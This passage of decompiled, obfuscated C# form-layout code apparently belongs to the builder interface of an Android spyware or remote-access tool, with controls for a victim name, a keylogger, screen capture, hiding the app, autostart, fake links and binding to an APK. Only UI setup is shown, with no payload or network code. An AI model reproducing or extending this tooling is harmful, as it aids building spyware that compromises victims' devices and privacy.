            ((Build) this).checkcatpure.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * -919491271 ^ -1787852901;
            continue;
          case 591:
            ((Build) this).TextNamePatch = new DrakeUITextBox();
            num1 = (int) num2 * 1919748646 ^ 1371060604;
            continue;
          case 592:
            ((Build) this).checkver.Location = new Point(318, 0);
            num1 = (int) num2 * 914736413 ^ -1713990223;
            continue;
          case 593:
            ((Build) this).TextPackage.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num2 * -210657541 ^ -1329307132;
            continue;
          case 594:
            ((Build) this).Label20.Text = EXGuarder.\u003193E5646;
            num1 = (int) num2 * 320947932 ^ 1426631776;
            continue;
          case 595:
            ((Build) this).addmintor.AvatarSize = 30;
            num1 = (int) num2 * 2893411 ^ 212189547;
            continue;
          case 596:
            ((Build) this).Label20.Location = new Point(202, 162);
            num1 = (int) num2 * -327293844 ^ -1116488350;
            continue;
          case 597:
            ((Build) this).CheckSkipre.Enabled = false;
            num1 = (int) num2 * 1235888644 ^ -1293997136;
            continue;
          case 598:
            ((Build) this).removmonitor.Margin = new Padding(4);
            ((Build) this).removmonitor.Name = EXGuarder.\u0035C225C5A;
            ((Build) this).removmonitor.Size = new Size(35, 30);
            ((Build) this).removmonitor.Style = UIStyle.Custom;
            ((Build) this).removmonitor.Symbol = 61526;
            num1 = (int) num2 * 1914727934 ^ -231621889;
            continue;
          case 599:
            ((Build) this).Label43.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * 1966745030 ^ -1320489862;
            continue;
          case 600:
            ((Build) this).panemnitor.TabIndex = 97;
            num1 = (int) num2 * 101109925 ^ 2088894512;
            continue;
          case 601:
            ((Build) this).Label18.AutoSize = true;
            num1 = (int) num2 * -864564604 ^ -48157186;
            continue;
          case 602:
            ((Build) this).combotype.FormattingEnabled = true;
            num1 = (int) num2 * 1130117811 ^ 1898161667;
            continue;
          case 603:
            ((Build) this).Label45.AutoSize = true;
            num1 = (int) num2 * 1894908625 ^ 27643272;
            continue;
          case 604:
            ((Build) this).delayaccesstext.Margin = new Padding(4);
            num1 = (int) num2 * -1027250947 ^ -998950410;
            continue;
          case 605:
            ((Build) this).FolderPath = new FolderBrowserDialog();
            ((Build) this).FilePathApk = new OpenFileDialog();
            ((Build) this).TOpacity = new Timer(((Build) this).components);
            num1 = (int) num2 * 226681061 ^ 528717702;
            continue;
          case 606:
            ((Build) this).Panel4.Margin = new Padding(4);
            num1 = (int) num2 * -1794242225 ^ -1111194629;
            continue;
          case 607:
            this.Controls.Add((Control) ((Build) this).box);
            this.DoubleBuffered = true;
            num1 = (int) num2 * -1894062163 ^ -157880108;
            continue;
          case 608:
            ((Build) this).bindbodytext.Font = new Font(EXGuarder.\u00339780D77, 9f, FontStyle.Bold);
            num1 = (int) num2 * 1794077109 ^ 2067419209;
            continue;
          case 609:
            ((Build) this).linkmonitor.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 334230724 ^ 841014927;
            continue;
          case 610:
            ((Build) this).Label28.Font = new Font(EXGuarder.\u00339780D77, 18f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label28.ForeColor = Color.White;
            num1 = (int) num2 * -273154368 ^ -1642592739;
            continue;
          case 611:
            ((Build) this).Label18.Size = new Size(16, 19);
            ((Build) this).Label18.TabIndex = 80;
            ((Build) this).Label18.Text = EXGuarder.\u003500A6952;
            ((Build) this).Label15.AutoSize = true;
            num1 = (int) num2 * -1418152982 ^ 1197965443;
            continue;
          case 612:
            ((Build) this).comboproms.Name = EXGuarder.\u0034A58124C;
            num1 = (int) num2 * -2139846242 ^ -1874306124;
            continue;
          case 613:
            ((Build) this).keeplivelabel.ForeColor = Color.White;
            ((Build) this).keeplivelabel.Location = new Point(121, 482);
            ((Build) this).keeplivelabel.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 2061675624 ^ 1585208412;
            continue;
          case 614:
            ((Build) this).Label41.Location = new Point(55, 340);
            ((Build) this).Label41.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -280907860 ^ 1362746870;
            continue;
          case 615:
            ((Build) this).TextNamePatch.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num2 * -2123672350 ^ -1548636776;
            continue;
          case 616:
            ((Build) this).TABCTRL.TabSelectedColor = Color.Black;
            num1 = (int) num2 * -2125698696 ^ -1842292580;
            continue;
          case 617:
            ((Build) this).Label50.TabIndex = 106;
            num1 = (int) num2 * 100846413 ^ -1550715987;
            continue;
          case 618:
            ((Build) this).logbtntext.Text = EXGuarder.\u00344227738;
            ((Build) this).logbtntext.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num2 * 1425371510 ^ 1338047108;
            continue;
          case 619:
            ((Build) this).CheckHide.Checked = true;
            ((Build) this).CheckHide.Cursor = Cursors.Hand;
            ((Build) this).CheckHide.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).CheckHide.Location = new Point(425, 611);
            num1 = (int) num2 * -427899900 ^ 1646381062;
            continue;
          case 620:
            ((Build) this).checkkeepsscreen.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * -333759935 ^ -424646095;
            continue;
          case 621:
            ((Build) this).Panel7.Controls.Add((Control) ((Build) this).Panel10);
            num1 = (int) num2 * -104226783 ^ 1992469199;
            continue;
          case 622:
            ((Build) this).fakepanel.Location = new Point(436, 36);
            num1 = (int) num2 * 2126739489 ^ -661144685;
            continue;
          case 623:
            ((ISupportInitialize) ((Build) this).fakeiconpic).BeginInit();
            num1 = (int) num2 * -1902203247 ^ 42741857;
            continue;
          case 624:
            ((Build) this).Label8.ForeColor = Color.White;
            num1 = (int) num2 * 213787276 ^ -6417088;
            continue;
          case 625:
            ((Build) this).checkautostart.TabIndex = 83;
            num1 = (int) num2 * 689442824 ^ -1882285384;
            continue;
          case 626:
            ((Build) this).Label32.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label32.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).Label32.Location = new Point(111, 477);
            ((Build) this).Label32.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 1033833116 ^ 428226702;
            continue;
          case 627:
            ((Build) this).Button3.Size = new Size(180, 34);
            ((Build) this).Button3.TabIndex = 44;
            num1 = (int) num2 * 633150161 ^ -1737946084;
            continue;
          case 628:
            ((Build) this).Label23.Font = new Font(EXGuarder.\u00339780D77, 10f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -253401162 ^ 2014333989;
            continue;
          case 629:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label50);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).checkunlocker);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label49);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).checknetwork);
            num1 = (int) num2 * 543203214 ^ 1543046913;
            continue;
          case 630:
            ((Build) this).checkunlocker.Text = EXGuarder.\u003341C3711;
            num1 = (int) num2 * -1180178703 ^ -1985431702;
            continue;
          case 631:
            ((Build) this).DrakeUIAvatar1.AvatarSize = 30;
            ((Build) this).DrakeUIAvatar1.BackColor = Color.Transparent;
            num1 = (int) num2 * -515739431 ^ 1359240144;
            continue;
          case 632:
            ((Build) this).Label8.Size = new Size(111, 19);
            ((Build) this).Label8.TabIndex = 101;
            num1 = (int) num2 * 903805486 ^ -571942929;
            continue;
          case 633:
            ((Build) this).CheckAllPrims.ForeColor = Color.White;
            num1 = (int) num2 * 959078692 ^ -635926366;
            continue;
          case 634:
            ((Build) this).MainText.Text = EXGuarder.\u0030E6B0328;
            ((Build) this).CheckHide.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 2050839634 ^ -1669621064;
            continue;
          case 635:
            ((Build) this).Label46.TabIndex = 101;
            num1 = (int) num2 * -1048719801 ^ 406246285;
            continue;
          case 636:
            ((Build) this).bndbtntext = new DrakeUITextBox();
            ((Build) this).bindbodytext = new TextBox();
            num1 = (int) num2 * -1807780466 ^ 1660578440;
            continue;
          case 637:
            ((Build) this).Label32.AutoSize = true;
            ((Build) this).Label32.BackColor = Color.Transparent;
            num1 = (int) num2 * 568414120 ^ -1140952831;
            continue;
          case 638:
            ((Build) this).Label2 = new Label();
            num1 = (int) num2 * 191609992 ^ 62203212;
            continue;
          case 639:
            ((Build) this).Generaltext.MinimumSize = new Size(2, 2);
            num1 = (int) num2 * 1420017803 ^ -1625062626;
            continue;
          case 640:
            ((Build) this).Label43.Name = EXGuarder.\u0030C352975;
            num1 = (int) num2 * 77645980 ^ -200541159;
            continue;
          case 641:
            ((Build) this).Label19.Location = new Point(428, 0);
            num1 = (int) num2 * -853986406 ^ 2077075455;
            continue;
          case 642:
            ((Build) this).Label49.Location = new Point(55, 165);
            num1 = (int) num2 * -759066694 ^ 957919070;
            continue;
          case 643:
            ((Build) this).checkcatpure.TabIndex = 77;
            ((Build) this).checkcatpure.Text = EXGuarder.\u00336222619;
            num1 = (int) num2 * -1783794607 ^ -418399525;
            continue;
          case 644:
            ((Build) this).TextPackage.Cursor = Cursors.IBeam;
            num1 = (int) num2 * 716695098 ^ 1576150862;
            continue;
          case 645:
            ((Build) this).checkemo = new DrakeUICheckBox();
            num1 = (int) num2 * 289290671 ^ -270657102;
            continue;
          case 646:
            ((Build) this).TextPackage.Watermark = EXGuarder.\u003250A4840;
            num1 = (int) num2 * -766255153 ^ -2086980036;
            continue;
          case 647:
            ((Build) this).comboproms.Location = new Point(102, 52);
            num1 = (int) num2 * 1891911112 ^ 122961275;
            continue;
          case 648:
            ((Build) this).TextSize.Location = new Point(71, 328);
            ((Build) this).TextSize.Margin = new Padding(4);
            ((Build) this).TextSize.Name = EXGuarder.\u0030A390018;
            ((Build) this).TextSize.Size = new Size(82, 27);
            num1 = (int) num2 * -713641738 ^ 1436745028;
            continue;
          case 649:
            ((Build) this).checkcaptureonce = new DrakeUICheckBox();
            num1 = (int) num2 * -1324654748 ^ -976183698;
            continue;
          case 650:
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).DrakeUIAvatar2);
            num1 = (int) num2 * 1429361144 ^ -2053199254;
            continue;
          case 651:
            ((Build) this).Label21.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1235302579 ^ 1305000313;
            continue;
          case 652:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).Label21);
            num1 = (int) num2 * -2097941727 ^ 512809358;
            continue;
          case 653:
            ((Build) this).trgtbkg.Radius = 10;
            num1 = (int) num2 * -1533632482 ^ 841545614;
            continue;
          case 654:
            ((Build) this).TABCTRL.Controls.Add((Control) ((Build) this).TabPage14);
            num1 = (int) num2 * -1226420083 ^ -1460384092;
            continue;
          case 655:
            ((Build) this).CheckFakeSize.Visible = false;
            ((Build) this).TabPage11.BackColor = Color.White;
            num1 = (int) num2 * 799155441 ^ 2041060692;
            continue;
          case 656:
            ((Build) this).removmonitor.ForeColor = Color.White;
            num1 = (int) num2 * 491627794 ^ 181328473;
            continue;
          case 657:
            ((Build) this).TextIP.Watermark = EXGuarder.\u0030E6B0328;
            num1 = (int) num2 * 361070041 ^ 1068995222;
            continue;
          case 658:
            ((Build) this).Label34.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label34.Name = EXGuarder.\u0035A426162;
            ((Build) this).Label34.Size = new Size(16, 19);
            num1 = (int) num2 * -1612160644 ^ 1907284359;
            continue;
          case 659:
            ((Build) this).Label46.Size = new Size(97, 24);
            num1 = (int) num2 * 847106721 ^ 62244999;
            continue;
          case 660:
            ((Build) this).TextIP.Name = EXGuarder.\u00369420A1F;
            num1 = (int) num2 * -1983094727 ^ 519211032;
            continue;
          case 661:
            ((Build) this).listmonitor.FillDisableColor = Color.FromArgb(20, 31, 20);
            num1 = (int) num2 * 779177793 ^ 70952192;
            continue;
          case 662:
            ((Build) this).Label28.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label28.Name = EXGuarder.\u0034F660D2D;
            ((Build) this).Label28.Size = new Size(213, 29);
            ((Build) this).Label28.TabIndex = 48;
            ((Build) this).Label28.Text = EXGuarder.\u0034E3D0B5F;
            ((Build) this).Nottitle.BackColor = Color.FromArgb(34, 34, 34);
            num1 = (int) num2 * 2024723087 ^ 700694572;
            continue;
          case 663:
            ((Build) this).Primslist.TabIndex = 24;
            num1 = (int) num2 * -2111281601 ^ -759943598;
            continue;
          case 664:
            ((Build) this).TextNamePatch.Margin = new Padding(5, 6, 5, 6);
            ((Build) this).TextNamePatch.Maximum = (double) int.MaxValue;
            ((Build) this).TextNamePatch.Minimum = (double) int.MinValue;
            num1 = (int) num2 * -795890020 ^ 983445481;
            continue;
          case 665:
            ((Build) this).randomverbtn = new DrakeUIAvatar();
            num1 = (int) num2 * 2082291116 ^ 1925209395;
            continue;
          case 666:
            ((Build) this).sizelabel.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).sizelabel.Name = EXGuarder.\u003582C4F6B;
            num1 = (int) num2 * -442431288 ^ -7904633;
            continue;
          case 667:
            ((Build) this).Checksuper.Style = UIStyle.Custom;
            num1 = (int) num2 * 50483597 ^ 2058102437;
            continue;
          case 668:
            ((Build) this).Label19.TextAlign = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * 119902621 ^ 900945786;
            continue;
          case 669:
            ((Build) this).Panel7.Controls.Add((Control) ((Build) this).panelmonitorb);
            ((Build) this).Panel7.Controls.Add((Control) ((Build) this).panemnitor);
            num1 = (int) num2 * 2145580568 ^ -997293018;
            continue;
          case 670:
            ((Build) this).Label36.Text = EXGuarder.\u003500A6952;
            ((Build) this).Label26.AutoSize = true;
            ((Build) this).Label26.BackColor = Color.Transparent;
            num1 = (int) num2 * -1862272671 ^ -828746138;
            continue;
          case 671:
            ((Build) this).linkmonitor.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num2 * 1524863115 ^ -405776869;
            continue;
          case 672:
            ((Build) this).CheckDoze.Name = EXGuarder.\u00358085E3F;
            num1 = (int) num2 * -1232024945 ^ -1789825850;
            continue;
          case 673:
            ((Build) this).TabPage9.Size = new Size(1004, 677);
            num1 = (int) num2 * 345531255 ^ 1316689705;
            continue;
          case 674:
            ((Build) this).TABCTRL.DrawMode = TabDrawMode.OwnerDrawFixed;
            num1 = (int) num2 * -301408306 ^ 1723575789;
            continue;
          case 675:
            ((Build) this).trackIDtext.Name = EXGuarder.\u00363506F4A;
            num1 = (int) num2 * 1048015026 ^ -711097883;
            continue;
          case 676:
            ((Build) this).addmintor.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).addmintor.ForeColor = Color.White;
            ((Build) this).addmintor.Location = new Point(390, 192);
            ((Build) this).addmintor.Margin = new Padding(4);
            ((Build) this).addmintor.Name = EXGuarder.\u00321365F5F;
            ((Build) this).addmintor.Size = new Size(35, 30);
            ((Build) this).addmintor.Style = UIStyle.Custom;
            ((Build) this).addmintor.Symbol = 61525;
            num1 = (int) num2 * -748388400 ^ 1746169225;
            continue;
          case 677:
            ((Build) this).DrakeUIAvatar1.SymbolSize = 30;
            num1 = (int) num2 * 1952682157 ^ 203252323;
            continue;
          case 678:
            ((Build) this).clonecheck.Size = new Size(260, 29);
            ((Build) this).clonecheck.Style = UIStyle.Custom;
            ((Build) this).clonecheck.TabIndex = 102;
            num1 = (int) num2 * 1872807360 ^ 2050258774;
            continue;
          case 679:
            ((Build) this).TabPage13.Location = new Point(0, 40);
            num1 = (int) num2 * 1838645887 ^ -610054631;
            continue;
          case 680:
            ((Build) this).Generaltext.Name = EXGuarder.\u003795E0138;
            ((Build) this).Generaltext.Size = new Size(304, 25);
            ((Build) this).Generaltext.Style = UIStyle.Custom;
            num1 = (int) num2 * 1691488091 ^ -613259923;
            continue;
          case 681:
            ((Build) this).CheckFakeSize.Style = UIStyle.Custom;
            num1 = (int) num2 * 279748092 ^ -1500772558;
            continue;
          case 682:
            ((Build) this).Label24 = new Label();
            ((Build) this).Notmsg = new TextBox();
            ((Build) this).Label12 = new Label();
            ((Build) this).TextSize = new TextBox();
            num1 = (int) num2 * -1246515284 ^ 1146959425;
            continue;
          case 683:
            ((Build) this).randomverbtn.Location = new Point(373, 391);
            ((Build) this).randomverbtn.Margin = new Padding(4);
            num1 = (int) num2 * -1681820017 ^ 2120705430;
            continue;
          case 684:
            ((Build) this).CheckQuick.Name = EXGuarder.\u003163B512A;
            ((Build) this).CheckQuick.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * -979379333 ^ -554152433;
            continue;
          case 685:
            ((Build) this).Label19.Text = EXGuarder.\u00319235A22;
            num1 = (int) num2 * 2117301784 ^ 1080574395;
            continue;
          case 686:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).TextNameVictim);
            num1 = (int) num2 * 2076307075 ^ -2102060911;
            continue;
          case 687:
            ((Build) this).SelectedApk.FillPressColor = Color.Black;
            num1 = (int) num2 * 941285995 ^ 305577774;
            continue;
          case 688:
            ((Build) this).delaylabelaccess.Name = EXGuarder.\u0035B38480D;
            num1 = (int) num2 * -1419793214 ^ -1343085348;
            continue;
          case 689:
            ((Build) this).checkkeyloger.Location = new Point(83, 305);
            num1 = (int) num2 * 1706328311 ^ 587616788;
            continue;
          case 690:
            ((Build) this).Label27.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -747042057 ^ 1452924444;
            continue;
          case 691:
            ((Build) this).Label47.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 676393261 ^ 1906140304;
            continue;
          case 692:
            ((Build) this).checkkeyloger.ForeColor = Color.White;
            num1 = (int) num2 * -1915165358 ^ -1773660928;
            continue;
          case 693:
            ((Build) this).Label47.TabIndex = 102;
            ((Build) this).Label47.Text = EXGuarder.\u003300C5A70;
            num1 = (int) num2 * 705773673 ^ 75155077;
            continue;
          case 694:
            ((Build) this).addmintor.SymbolSize = 30;
            ((Build) this).addmintor.TabIndex = 101;
            num1 = (int) num2 * -1763968874 ^ -910351718;
            continue;
          case 695:
            ((Build) this).randomidbtn.TabIndex = 99;
            ((Build) this).randomidbtn.Text = EXGuarder.\u00373182D5A;
            num1 = (int) num2 * 214010852 ^ 1047920423;
            continue;
          case 696:
            ((Build) this).addactiv = new DrakeUIAvatar();
            ((Build) this).comboproms = new DrakeUIComboBox();
            ((Build) this).Panel8 = new Panel();
            ((Build) this).Label39 = new Label();
            num1 = (int) num2 * 1854271884 ^ -556682730;
            continue;
          case 697:
            ((Build) this).checkemo.Name = EXGuarder.\u0034D232202;
            ((Build) this).checkemo.Padding = new Padding(22, 0, 0, 0);
            ((Build) this).checkemo.Size = new Size(338, 29);
            num1 = (int) num2 * -1406191619 ^ 1776211442;
            continue;
          case 698:
            ((Build) this).tracklist.ItemSelectBackColor = Color.FromArgb(140, 140, 140);
            ((Build) this).tracklist.ItemSelectForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 2068382572 ^ 1481226085;
            continue;
          case 699:
            ((Build) this).Textfakelink.Maximum = (double) int.MaxValue;
            ((Build) this).Textfakelink.Minimum = (double) int.MinValue;
            ((Build) this).Textfakelink.Name = EXGuarder.\u00377311633;
            ((Build) this).Textfakelink.Padding = new Padding(7, 6, 7, 6);
            ((Build) this).Textfakelink.Radius = 10;
            ((Build) this).Textfakelink.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1279743005 ^ 752525122;
            continue;
          case 700:
            ((Build) this).Label1.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -257191106 ^ 905699847;
            continue;
          case 701:
            ((Build) this).combotype.Items.AddRange(new object[8]
            {
              (object) EXGuarder.\u00326352F2E,
              (object) EXGuarder.\u0034D4F241F,
              (object) EXGuarder.\u0033C2E3557,
              (object) EXGuarder.\u003471A0A18,
              (object) EXGuarder.\u00368532425,
              (object) EXGuarder.\u003582A441D,
              (object) EXGuarder.\u00371276B15,
              (object) EXGuarder.\u00313145947
            });
            num1 = (int) num2 * 334611436 ^ -2084464395;
            continue;
          case 702:
            ((Build) this).panemnitor.Controls.Add((Control) ((Build) this).Label42);
            num1 = (int) num2 * 518950991 ^ -1976034060;
            continue;
          case 703:
            ((Build) this).Label39.Size = new Size(480, 33);
            num1 = (int) num2 * -905994 ^ -1899581366;
            continue;
          case 704:
            ((Build) this).Label41.BackColor = Color.Transparent;
            ((Build) this).Label41.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1103083927 ^ -833693382;
            continue;
          case 705:
            ((Build) this).MainText.Size = new Size(84, 24);
            num1 = (int) num2 * 1826346956 ^ -1316308600;
            continue;
          case 706:
            ((Build) this).removmonitor.SymbolSize = 30;
            ((Build) this).removmonitor.TabIndex = 102;
            num1 = (int) num2 * -1872653720 ^ -1374137152;
            continue;
          case 707:
            ((Build) this).panemnitor.Controls.Add((Control) ((Build) this).Label40);
            ((Build) this).panemnitor.Controls.Add((Control) ((Build) this).Label36);
            num1 = (int) num2 * -35499331 ^ 1108198888;
            continue;
          case 708:
            ((Build) this).fakepanel.Margin = new Padding(4);
            num1 = (int) num2 * 253975961 ^ -696342258;
            continue;
          case 709:
            ((Build) this).Label50.Name = EXGuarder.\u0032A097720;
            num1 = (int) num2 * 408704686 ^ 253301953;
            continue;
          case 710:
            ((Build) this).bindbodytext.TextAlign = HorizontalAlignment.Center;
            num1 = (int) num2 * 1553941289 ^ 919541123;
            continue;
          case 711:
            ((Build) this).Panel10.Controls.Add((Control) ((Build) this).Label15);
            num1 = (int) num2 * 1626301552 ^ 930233512;
            continue;
          case 712:
            ((Build) this).Label9.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -1415597882 ^ -2060825337;
            continue;
          case 713:
            ((Build) this).Label27.AutoSize = true;
            num1 = (int) num2 * -347353082 ^ 2096595508;
            continue;
          case 714:
            ((Build) this).tracklist.Radius = 15;
            num1 = (int) num2 * -170000905 ^ -1449222044;
            continue;
          case 715:
            ((Build) this).TextVersion.TabIndex = 101;
            num1 = (int) num2 * 401318924 ^ 1007111577;
            continue;
          case 716:
            ((Build) this).bindbodytext.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num2 * 1682076088 ^ 154746488;
            continue;
          case 717:
            ((Build) this).DrakeUIAvatar2.Cursor = Cursors.Hand;
            num1 = (int) num2 * 2079669826 ^ 1223764213;
            continue;
          case 718:
            ((Build) this).startTime = new Timer(((Build) this).components);
            num1 = (int) num2 * 124070354 ^ 1945866056;
            continue;
          case 719:
            ((Build) this).checkprotector.TabIndex = 72;
            num1 = (int) num2 * -721498355 ^ -911837795;
            continue;
          case 720:
            ((Build) this).logbodytext.Font = new Font(EXGuarder.\u00339780D77, 9f, FontStyle.Bold);
            ((Build) this).logbodytext.ForeColor = Color.White;
            ((Build) this).logbodytext.Location = new Point(308, 311);
            num1 = (int) num2 * -1519196372 ^ -1183204846;
            continue;
          case 721:
            ((Build) this).randomidbtn.SymbolSize = 30;
            num1 = (int) num2 * 2116330652 ^ -1385431642;
            continue;
          case 722:
            ((Build) this).Label34.TabIndex = 82;
            ((Build) this).Label34.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * 121700189 ^ -840749734;
            continue;
          case 723:
            ((Build) this).CheckFakeSize.Text = EXGuarder.\u00348053600;
            num1 = (int) num2 * 616433985 ^ -634428111;
            continue;
          case 724:
            ((Build) this).Label23.ForeColor = Color.White;
            num1 = (int) num2 * 307883111 ^ -510807430;
            continue;
          case 725:
            ((Build) this).Label20.Size = new Size(108, 24);
            num1 = (int) num2 * -556467042 ^ 107067762;
            continue;
          case 726:
            ((Build) this).ToolTip1.AutoPopDelay = 5000;
            ((Build) this).ToolTip1.InitialDelay = 1000;
            ((Build) this).ToolTip1.ReshowDelay = 100;
            this.AutoScaleMode = AutoScaleMode.None;
            this.AutoSize = true;
            this.BackColor = Color.FromArgb(10, 0, 10);
            this.ClientSize = new Size(1006, 734);
            num1 = (int) num2 * 1225104727 ^ -843423972;
            continue;
          case 727:
            ((Build) this).checkkeyloger.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 677084155 ^ 2001175696;
            continue;
          case 728:
            ((Build) this).keeplivelabel.BackColor = Color.Transparent;
            num1 = (int) num2 * -1933755685 ^ -1068805801;
            continue;
          case 729:
            ((Build) this).CheckDraw.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -967727123 ^ -1213879138;
            continue;
          case 730:
            ((Build) this).SelectedApk.FillSelectedColor = Color.FromArgb(254, 0, 0);
            ((Build) this).SelectedApk.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -1622069693 ^ 1060219451;
            continue;
          case 731:
            ((Build) this).CheckAllPrims.Location = new Point(267, 51);
            num1 = (int) num2 * -2073564507 ^ 714720475;
            continue;
          case 732:
            ((Build) this).checkcaptureonce.Style = UIStyle.Custom;
            num1 = (int) num2 * -472159881 ^ -1939158669;
            continue;
          case 733:
            ((Build) this).trackIDtext.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num2 * 1700079148 ^ -1113951517;
            continue;
          case 734:
            ((Build) this).TABCTRL.TabIndex = 16;
            num1 = (int) num2 * 1019142605 ^ -1820535159;
            continue;
          case 735:
            ((Build) this).TextNameVictim.Cursor = Cursors.IBeam;
            num1 = (int) num2 * -1812111885 ^ 1965129998;
            continue;
          case 736:
            ((Build) this).Label3.ForeColor = Color.White;
            num1 = (int) num2 * 648316329 ^ -960307292;
            continue;
          case 737:
            ((Build) this).TextSize.TabIndex = 45;
            num1 = (int) num2 * -520527992 ^ 362656239;
            continue;
          case 738:
            ((Build) this).TabPage14.Controls.Add((Control) ((Build) this).TextBox1);
            num1 = (int) num2 * 1101301696 ^ 661466259;
            continue;
          case 739:
            ((Build) this).randomverbtn.Style = UIStyle.Custom;
            ((Build) this).randomverbtn.Symbol = 61473;
            num1 = (int) num2 * 2085835378 ^ -1932352661;
            continue;
          case 740:
            ((Build) this).Label45 = new Label();
            ((Build) this).bindCtitle = new TextBox();
            num1 = (int) num2 * -988765565 ^ -277880558;
            continue;
          case 741:
            ((Build) this).checkkeyloger.Style = UIStyle.Custom;
            ((Build) this).checkkeyloger.TabIndex = 71;
            num1 = (int) num2 * 419953750 ^ 1416515416;
            continue;
          case 742:
            ((Build) this).explainoptionstext.Size = new Size(1004, 90);
            ((Build) this).explainoptionstext.TabIndex = 72;
            num1 = (int) num2 * 360245809 ^ -1449544661;
            continue;
          case 743:
            ((Build) this).TextPackage.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1278063565 ^ 432766025;
            continue;
          case 744:
            ((Build) this).idmonitor.TabIndex = 96;
            num1 = (int) num2 * -1921298460 ^ -571056344;
            continue;
          case 745:
            ((Build) this).TextVersion.FillColor = Color.Black;
            ((Build) this).TextVersion.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -2018453944 ^ 1596371389;
            continue;
          case 746:
            ((Build) this).CheckHidePrims.Cursor = Cursors.Hand;
            num1 = (int) num2 * -876692900 ^ 504811126;
            continue;
          case 747:
            ((Build) this).Label16.TabIndex = 57;
            num1 = (int) num2 * 993996217 ^ 2134306157;
            continue;
          case 748:
            ((Build) this).Primslist.RectDisableColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).Primslist.Size = new Size(299, 171);
            num1 = (int) num2 * 332050648 ^ 1138146744;
            continue;
          case 749:
            ((Build) this).Panel4.TabIndex = 47;
            ((Build) this).Label28.AutoSize = true;
            ((Build) this).Label28.BackColor = Color.Transparent;
            num1 = (int) num2 * 1969465815 ^ -41964350;
            continue;
          case 750:
            ((Build) this).checkcaptureonce.Name = EXGuarder.\u003361C0E63;
            ((Build) this).checkcaptureonce.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 34956430 ^ -465787882;
            continue;
          case 751:
            ((ISupportInitialize) ((Build) this).cusomupdateimg).BeginInit();
            num1 = (int) num2 * -707717250 ^ 865530103;
            continue;
          case 752:
            ((Build) this).Label48.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 25917487 ^ 1661839052;
            continue;
          case 753:
            ((Build) this).TextNamePatch.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * 915307736 ^ -2043693811;
            continue;
          case 754:
            ((Build) this).checksignver.FormattingEnabled = true;
            ((Build) this).checksignver.ItemHeight = 20;
            num1 = (int) num2 * -1942795051 ^ -2028135111;
            continue;
          case 755:
            ((Build) this).Checksuper.Text = EXGuarder.\u0030B571B0E;
            ((Build) this).checkkeyloger.CheckBoxColor = Color.FromArgb(192, 0, 0);
            num1 = (int) num2 * 1092702462 ^ -1651055302;
            continue;
          case 756:
            ((Build) this).fakepanel.SuspendLayout();
            num1 = (int) num2 * -717889404 ^ 1872048844;
            continue;
          case 757:
            ((Build) this).tracklist.StyleCustomMode = true;
            num1 = (int) num2 * 1804699435 ^ -1790716352;
            continue;
          case 758:
            ((Build) this).Label7.BackColor = Color.Transparent;
            num1 = (int) num2 * -582437279 ^ -71740285;
            continue;
          case 759:
            ((Build) this).Panel1.Controls.Add((Control) ((Build) this).checkver);
            ((Build) this).Panel1.Controls.Add((Control) ((Build) this).Label48);
            num1 = (int) num2 * 2059568243 ^ 1652444275;
            continue;
          case 760:
